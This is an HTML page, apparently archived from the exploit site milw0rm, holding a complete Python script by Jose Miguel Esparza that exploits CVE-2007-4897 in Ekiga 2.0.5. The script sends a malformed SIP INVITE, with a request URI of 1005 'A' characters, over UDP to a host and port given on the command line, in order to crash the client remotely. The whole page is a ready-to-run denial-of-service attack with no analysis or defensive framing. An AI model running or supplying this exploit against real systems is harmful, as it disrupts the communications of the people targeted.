<html><head><title>Ekiga 2.0.5 (GetHostAddress) Remote Denial of Service Exploit</title></head><pre>#!/usr/bin/env python
#
# Ekiga GetHostAddress Remote Denial of Service Vulnerability (CVE-2007-4897)
#
# ekiga207_dos.py by Jose Miguel Esparza
# 2007-09-11 S21sec labs

import sys,socket

if len(sys.argv) != 3: 
	sys.exit(&quot;Usage: &quot; + sys.argv[0] + &quot; target_host target_port\n&quot;)
target = sys.argv[1]
targetPort = int(sys.argv[2])
malformedRequest = &quot;INVITE &quot;+'A'*1005+&quot; SIP/2.0\r\n&quot;+\
		   &quot;Call-ID:f81d4fae-7dec-11d0-a765-00a0c91e6bf6@foo.bar.com\r\n&quot;+\
		   &quot;Contact:sip:pepe@172.91.1.133:5060\r\n&quot;+\
		   &quot;Content-Length:417\r\n&quot;+\
		   &quot;Content-Type:application/sdp\r\n&quot;+\
		   &quot;CSeq:4321 INVITE\r\n&quot;+\
		   &quot;From:sip:pepe@172.91.1.148:5060;tag=a48s\r\n&quot;+\
		   &quot;Max-Forwards:70\r\n&quot;+\
         &quot;To:sip:paco@micasa.com\r\n&quot;+\
         &quot;Via:SIP/2.0/UDP 172.91.1.148:5060;branch=z9hG4bK74b76\r\n\r\n&quot;		 

s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
s.connect((target,targetPort))
s.sendall(malformedRequest)
s.close()

# milw0rm.com [2009-07-24]</pre></html>